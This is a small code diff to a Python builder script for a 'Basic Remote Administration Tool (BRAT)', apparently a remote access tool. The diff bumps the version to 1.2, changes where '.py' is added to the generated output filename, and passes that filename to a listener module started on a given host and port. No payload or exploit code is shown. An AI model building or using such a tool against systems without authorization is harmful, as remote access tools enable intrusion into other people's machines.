@@ -26,7 +26,7 @@ except FileNotFoundError:
     sys.exit(0)
 
 def logo():
-    print("\n[i] Basic Remote Administration Tool (BRAT) v1.0\n[i] Catayao56\n\n")
+    print("\n[i] Basic Remote Administration Tool (BRAT) v1.2\n[i] Catayao56\n\n")
 
 def help():
     print("""\
@@ -77,6 +77,7 @@ def main():
 
         elif "set output" in cmd:
             output = cmd.split()[-1]
+            output = output + '.py'
 
         elif cmd == "show values":
             print("\n[+] HOST   : %s\n[+] PORT   : %s\n[+] OUTPUT : %s\n"%(host, port,output))
@@ -91,7 +92,6 @@ def main():
                 try:
                     open(output, 'r').read()
                     open(output, 'r').close()
-                    output = output + '.py'
                 
                 except FileNotFoundError:
                     open(output, 'w').write('')
@@ -117,7 +117,7 @@ def main():
                 if os.name == "nt":
                     subprocess.Popen([sys.executable, 'modules/listener.py', host, str(port)], creationflags=subprocess.CREATE_NEW_CONSOLE)
                 else:
-                    os.system(sys.executable + " modules/listener.py %s %s"%(host, str(port)))
+                    os.system(sys.executable + " modules/listener.py %s %s %s"%(host, str(port), output))
             else:
                 print("\n[!] Host : %s\n[!] Port : %s\n"%(host,port))
 
